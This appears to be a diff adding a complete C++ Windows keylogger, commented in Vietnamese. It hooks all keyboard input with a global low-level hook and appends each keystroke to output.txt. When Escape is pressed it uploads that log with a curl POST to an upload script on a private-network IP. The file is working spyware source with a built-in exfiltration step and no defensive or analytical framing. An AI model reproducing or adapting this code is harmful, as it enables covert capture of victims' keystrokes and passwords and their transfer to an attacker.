@@ -1,0 +1,55 @@
+#include <iostream>
+#include <fstream>
+#include <windows.h>
+
+HHOOK hook;
+
+LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode >= 0) {
+        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
+        DWORD vkCode = kbdStruct->vkCode;
+        DWORD flags = kbdStruct->flags;
+
+        // Kiểm tra nếu là sự kiện phím được nhấn
+        if (wParam == WM_KEYDOWN && !(flags & LLKHF_INJECTED)) {
+            char keyName[256] = { 0 }; // Khởi tạo mảng để lưu tên phím
+            UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC); // Lấy mã scan code từ mã phím
+            int result = GetKeyNameTextA(scanCode << 16, keyName, sizeof(keyName)); // Lấy tên phím dựa trên mã scan code
+            if (result != 0) {
+                std::ofstream outfile("output.txt", std::ios_base::app); // Mở tệp tin để ghi vào cuối tệp
+                if (outfile.is_open()) {
+                    outfile << "Key pressed: " << keyName << std::endl;
+                    outfile.close();
+                }
+                else {
+                    std::cerr << "Error: Unable to open file for writing!" << std::endl;
+                }
+
+                // Kiểm tra nếu phím Esc được nhấn, thoát chương trình
+                if (vkCode == VK_ESCAPE) {
+                    system("curl http://192.168.255.2/upload.php -X POST -F \"file=@C:\\Users\\ASUS\\source\\repos\\ConsoleApplication2\\ConsoleApplication2\\output.txt\"");
+                    PostQuitMessage(0);
+                }
+            }
+        }
+    }
+    return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
+
+int main() {
+    hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
+    if (hook == NULL) {
+        std::cerr << "Failed to install hook!" << std::endl;
+        return 1;
+    }
+
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+
+    UnhookWindowsHookEx(hook);
+
+    return 0;
+}
